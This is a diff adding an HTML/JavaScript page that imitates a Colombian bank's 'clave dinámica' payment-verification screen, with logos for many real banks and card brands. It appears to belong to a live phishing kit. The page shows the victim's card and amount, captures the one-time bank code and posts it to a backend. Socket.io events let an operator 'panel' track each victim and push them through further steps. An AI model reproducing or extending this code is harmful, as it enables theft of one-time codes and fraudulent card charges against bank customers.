@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clave Dinámica</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background: white;
+            border-radius: 8px;
+            padding: 3rem;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-banco {
+            height: 24px;
+            width: auto;
+            max-width: 120px;
+            object-fit: contain;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #666;
+            cursor: pointer;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .close-btn:hover {
+            color: #333;
+        }
+
+        .franquicia-logo {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            height: 50px;
+            width: auto;
+            object-fit: contain;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .franquicia-logo.loaded {
+            opacity: 1;
+        }
+
+        .logo-banco {
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .logo-banco.loaded {
+            opacity: 1;
+        }
+
+        .spinner-loading {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #0d472f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 2rem auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .info-section {
+            margin-bottom: 2rem;
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .info-section p {
+            margin-bottom: 0.8rem;
+        }
+
+        .monto {
+            font-weight: 600;
+            color: #222;
+        }
+
+        .form-group {
+            margin-bottom: 2rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 0.8rem;
+            font-weight: 500;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: 'Segoe UI', sans-serif;
+            transition: border-color 0.3s;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #0052CC;
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background-color: #0052CC;
+            color: white;
+            margin-bottom: 1.5rem;
+        }
+
+        .btn-primary:hover {
+            background-color: #0041A6;
+            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            opacity: 0.7;
+            box-shadow: none;
+        }
+
+        .btn-primary.loading {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .spinner-mini {
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .resend-link {
+            display: block;
+            text-align: center;
+            color: #0052CC;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 1.5rem;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+
+        .more-info {
+            display: block;
+            text-align: center;
+            color: #000;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .more-info:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            display: none;
+            color: #dc3545;
+            font-size: 13px;
+            padding: 12px;
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+            border-left: 4px solid #dc3545;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 1.5rem;
+            }
+
+            .title {
+                font-size: 18px;
+            }
+
+            .info-section {
+                font-size: 13px;
+            }
+
+            .franquicia-logo {
+                height: 40px;
+            }
+        }
+
+        .modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .modal-header {
+            background: #0d472f;
+            color: white;
+            padding: 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-header h2 {
+            margin: 0;
+            font-size: 1.3rem;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-close:hover {
+            opacity: 0.8;
+        }
+
+        .modal-body {
+            padding: 2rem;
+        }
+
+        .instruction-step {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .instruction-step:last-child {
+            margin-bottom: 0;
+        }
+
+        .step-number {
+            background: #0d472f;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            padding-top: 0.5rem;
+            color: #333;
+            font-size: 0.95rem;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img id="logoBanco" class="logo-banco" alt="Banco">
+        </div>
+
+        <img id="franquiciaLogo" class="franquicia-logo" alt="Franquicia">
+
+        <h1 class="title">Ingresa tu clave dinámica</h1>
+
+        <div class="info-section" id="infoSection">
+            <p>Para autorizar un pago a <span id="merchantName">-</span> por valor de <span class="monto" id="montoDisplay">$-</span> de <span id="dateDisplay">-</span> con tu tarjeta <span id="cardDisplay">-</span>.</p>
+            <p>¡Avancemos con la compra! Para terminar y por seguridad, necesitamos confirmar que eres tú quién está detrás de esta pantalla. Ingresa un dato que solo tú conoces. Consulta tu clave dinámica y escríbela aquí.</p>
+        </div>
+
+        <form id="dinamicaForm">
+            <div id="errorMessage" class="error-message"></div>
+
+            <div class="form-group">
+                <label for="dinamicaInput">Clave Dinámica</label>
+                <input
+                    type="text"
+                    id="dinamicaInput"
+                    class="form-control"
+                    placeholder="Ingresa el código"
+                    minlength="6"
+                    maxlength="6"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                    autocomplete="off"
+                    autofocus
+                >
+            </div>
+
+            <button type="submit" id="continueBtn" class="btn btn-primary">CONTINUAR</button>
+        </form>
+
+        <a href="#" class="more-info" id="moreInfoBtn">Más información</a>
+    </div>
+
+    <!-- Modal de instrucciones -->
+    <div id="instructionsModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Cómo consultar tu clave dinámica</h2>
+                <button class="modal-close" id="closeModalBtn">×</button>
+            </div>
+            <div class="modal-body">
+                <div class="instruction-step">
+                    <div class="step-number">1</div>
+                    <div class="step-text">Abre la aplicación de tu banco en tu dispositivo</div>
+                </div>
+                <div class="instruction-step">
+                    <div class="step-number">2</div>
+                    <div class="step-text">Consulta tu clave dinámica</div>
+                </div>
+                <div style="text-align:center;padding:1rem;margin:1.5rem 0;width:100%">
+                    <img src="assets/dinamica.png" alt="Clave Dinámica" style="max-width:180px;height:auto;display:block;margin:0 auto">
+                </div>
+                <div class="instruction-step">
+                    <div class="step-number">3</div>
+                    <div class="step-text">Ingresa el código en el campo "Clave Dinámica" de esta pantalla</div>
+                </div>
+                <div class="instruction-step">
+                    <div class="step-number">4</div>
+                    <div class="step-text">Haz clic en el botón "CONTINUAR" para validar tu compra</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // INICIALIZACIÓN
+        // ============================================
+        const params = new URLSearchParams(window.location.search);
+        const txId = params.get('txId');
+        let monto, email, merchant, nombre, documento, placa, tarjeta, franquicia, bankname;
+
+        console.log('[DINAMICA] txId:', txId);
+
+        // Cargar datos seguros del servidor
+        async function cargarDatos() {
+            if (!txId) {
+                console.error('[DINAMICA] Faltan parámetros requeridos');
+                return;
+            }
+            try {
+                const response = await fetch(`http://localhost:9090/api/transaccion-tarjeta/${txId}`);
+                const result = await response.json();
+
+                if (result.ok && result.data) {
+                    const data = result.data;
+                    monto = data.monto;
+                    merchant = 'TIGO'; // Siempre TIGO para pagos de tarjeta
+                    nombre = data.nombre || 'Cliente';
+                    tarjeta = data.cardNumber;
+                    franquicia = data.franquicia || 'VISA';
+                    bankname = data.bankName || '';
+
+                    console.log('[DINAMICA] Datos cargados desde R2:', data);
+
+                    // Llenar información de la compra
+                    const fecha = new Date().toLocaleDateString('es-CO');
+                    document.getElementById('montoDisplay').textContent = `$${parseInt(monto).toLocaleString('es-CO')}`;
+                    document.getElementById('dateDisplay').textContent = fecha;
+                    document.getElementById('cardDisplay').textContent = tarjeta;
+                    document.getElementById('merchantName').textContent = merchant;
+
+                    mostrarLogoBanco();
+                } else {
+                    console.error('[DINAMICA] Error:', result.error);
+                    alert('Error cargando transacción: ' + result.error);
+                }
+            } catch (err) {
+                console.error('[DINAMICA] Error cargando datos:', err);
+                alert('Error: ' + err.message);
+            }
+        }
+
+        cargarDatos();
+
+        // Mapeo de bancos a logos
+        const bankLogos = {
+            'accion fiduciaria': 'accionfiduciaria.svg',
+            'agrario': 'agrario.svg',
+            'agrobank': 'agrario.svg',
+            'av villas': 'avvillas.svg',
+            'avvillas': 'avvillas.svg',
+            'ban 100': 'ban100.svg',
+            'ban100': 'ban100.svg',
+            'banca mia': 'bancamia.svg',
+            'bancamia': 'bancamia.svg',
+            'bancolombia': 'bancolombia.svg',
+            'bbva': 'bbva.svg',
+            'banco bogota': 'bogota.svg',
+            'bogota': 'bogota.svg',
+            'banco cajasocial': 'cajasocial.svg',
+            'cajasocial': 'cajasocial.svg',
+            'cfa': 'cfa.svg',
+            'chase': 'chase.svg',
+            'city bank': 'citybank.svg',
+            'citybank': 'citybank.svg',
+            'coink': 'coink.svg',
+            'colpatria': 'colpatria.svg',
+            'colte financiera': 'coltefinanciera.svg',
+            'coltefinanciera': 'coltefinanciera.svg',
+            'coofinep': 'coofinep.svg',
+            'coomeva': 'coomeva.svg',
+            'coop central': 'coopcentral.svg',
+            'cooperativa confiar': 'cooperativaConfiar.svg',
+            'cotrafa': 'cotrafa.svg',
+            'dale': 'dale.svg',
+            'davibank': 'davibank.svg',
+            'daviplata': 'daviplata.svg',
+            'davivienda': 'davivienda.svg',
+            'ding': 'ding.svg',
+            'falabella': 'falabella.svg',
+            'finandina': 'finandina.svg',
+            'global': 'global.svg',
+            'iris bank': 'irisbank.svg',
+            'itau': 'itau.svg',
+            'jpmorgan': 'jpmorgan.svg',
+            'lulo': 'lulo.svg',
+            'movii': 'movii.svg',
+            'mundo mujer': 'mundomujer.svg',
+            'nequi': 'nequiLogo.svg',
+            'nu': 'nu.svg',
+            'occidente': 'occidente.svg',
+            'paycash': 'paycash.svg',
+            'pichincha': 'pichincha.svg',
+            'banco popular': 'popular.svg',
+            'popular': 'popular.svg',
+            'powwi': 'powwi.svg',
+            'rappipay': 'rappipay.svg',
+            'santander': 'santander.svg',
+            'serfinanza': 'serfinanza.svg',
+            'sudameris': 'sudameris.svg',
+            'uala': 'uala.svg',
+            'union': 'union.svg',
+            'DEFAULT': 'default.svg'
+        };
+
+        // Mapeo de franquicias a logos
+        const franquiciaLogos = {
+            'VISA': 'visa.png',
+            'MASTERCARD': 'master.png',
+            'AMEX': 'amex.png',
+            'DINERS': 'diners.png'
+        };
+
+        // Detectar banco por nombre
+        function getBankLogo() {
+            if (!bankname) return 'default.svg';
+            const banknameLower = bankname.toLowerCase().normalize('NFD').replace(/[̀-ͯ]/g, '');
+            const bankKey = Object.keys(bankLogos).find(key => banknameLower.includes(key) || key.includes(banknameLower));
+            return bankLogos[bankKey] || 'default.svg';
+        }
+
+        // Mostrar logos cuando datos se carguen
+        function mostrarLogoBanco() {
+            const bankLogo = getBankLogo();
+            const franqLogo = franquiciaLogos[franquicia];
+
+            if (bankLogo && franqLogo) {
+                const logoBancoEl = document.getElementById('logoBanco');
+                const franquiciaLogoEl = document.getElementById('franquiciaLogo');
+
+                logoBancoEl.src = `assets/logos/${bankLogo}`;
+                franquiciaLogoEl.src = `assets/logos/${franqLogo}`;
+
+                logoBancoEl.onload = () => logoBancoEl.classList.add('loaded');
+                franquiciaLogoEl.onload = () => franquiciaLogoEl.classList.add('loaded');
+            }
+        }
+
+        // Socket.io
+        const socket = io();
+
+        // ============================================
+        // LISTENERS SOCKET.IO
+        // ============================================
+
+        socket.on('clave_verificada', (data) => {
+            console.log('[DINAMICA] Respuesta del panelito:', data);
+            if (data.success) {
+                window.location.href = `/processing?txId=${txId}`;
+            } else {
+                mostrarError(data.error || 'Clave incorrecta. Intenta de nuevo.');
+            }
+        });
+
+        socket.on('transaccion_confirmada', (data) => {
+            console.log('[DINAMICA] Panelito confirmó transacción');
+            if (data.success) {
+                window.location.href = `/confirmation?txId=${data.txId}&monto=${monto}&email=${email}&nombre=${nombre}&documento=${documento}&placa=${placa}&franquicia=${franquicia}&bankname=${encodeURIComponent(bankname)}`;
+            }
+        });
+
+        socket.on('transaccion_error', (data) => {
+            console.log('[DINAMICA] Error:', data);
+            mostrarError('Error: ' + data.error);
+        });
+
+        // ============================================
+        // FUNCIONES
+        // ============================================
+
+        function mostrarError(mensaje) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = mensaje;
+            errorDiv.classList.add('show');
+        }
+
+        function ocultarError() {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.classList.remove('show');
+            errorDiv.textContent = '';
+        }
+
+        function volverAlProcesando() {
+            window.location.href = `/processing?txId=${txId}&monto=${monto}&email=${email}&nombre=${nombre}&documento=${documento}&placa=${placa}&franquicia=${franquicia}&bankname=${encodeURIComponent(bankname)}`;
+        }
+
+        // ============================================
+        // EVENT LISTENERS
+        // ============================================
+
+        document.getElementById('dinamicaForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const codigo = document.getElementById('dinamicaInput').value.trim();
+            const btn = document.getElementById('continueBtn');
+
+            if (!codigo) {
+                mostrarError('Por favor ingresa un código');
+                return;
+            }
+
+            if (!/^\d+$/.test(codigo)) {
+                mostrarError('Solo se permiten dígitos');
+                return;
+            }
+
+            if (codigo.length > 6) {
+                mostrarError('Máximo 6 dígitos permitidos');
+                return;
+            }
+
+            // Desabilitar botón y mostrar spinner
+            btn.disabled = true;
+            btn.classList.add('loading');
+            btn.innerHTML = '<span class="spinner-mini"></span> PROCESANDO';
+
+            ocultarError();
+            console.log('[DINAMICA] Guardando código:', codigo);
+
+            try {
+                // Guardar clave dinámica
+                const response = await fetch('http://localhost:9090/api/guardar-dinamica', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        txId: txId,
+                        dinamica: codigo
+                    })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    console.log('[DINAMICA] ✓ Clave guardada en R2');
+
+                    // Limpiar acción para volver a STANDBY
+                    await fetch(`http://localhost:9090/api/limpiar-accion/${txId}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ accion: 'DINAMICA' })
+                    });
+
+                    // Volver a processing para esperar siguiente acción
+                    window.location.href = `/processing?txId=${txId}`;
+                } else {
+                    mostrarError(data.message || 'Error al guardar clave');
+                    btn.disabled = false;
+                    btn.classList.remove('loading');
+                    btn.innerHTML = 'CONTINUAR';
+                }
+            } catch (error) {
+                console.error('[DINAMICA] Error:', error);
+                mostrarError('Error al guardar clave');
+                btn.disabled = false;
+                btn.classList.remove('loading');
+                btn.innerHTML = 'CONTINUAR';
+            }
+        });
+
+        // Modal de instrucciones
+        document.getElementById('moreInfoBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            document.getElementById('instructionsModal').style.display = 'flex';
+        });
+
+        document.getElementById('closeModalBtn').addEventListener('click', () => {
+            document.getElementById('instructionsModal').style.display = 'none';
+        });
+
+        document.getElementById('instructionsModal').addEventListener('click', (e) => {
+            if (e.target.id === 'instructionsModal') {
+                document.getElementById('instructionsModal').style.display = 'none';
+            }
+        });
+
+        document.getElementById('dinamicaInput').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 6);
+            ocultarError();
+        });
+
+        // Notificar que usuario llegó
+        socket.emit('usuario_en_dinamica', {
+            idTransaccion: txId,
+            timestamp: new Date().toISOString()
+        });
+
+        console.log('[DINAMICA] ✅ Página lista');
+    </script>
+</body>
+</html>
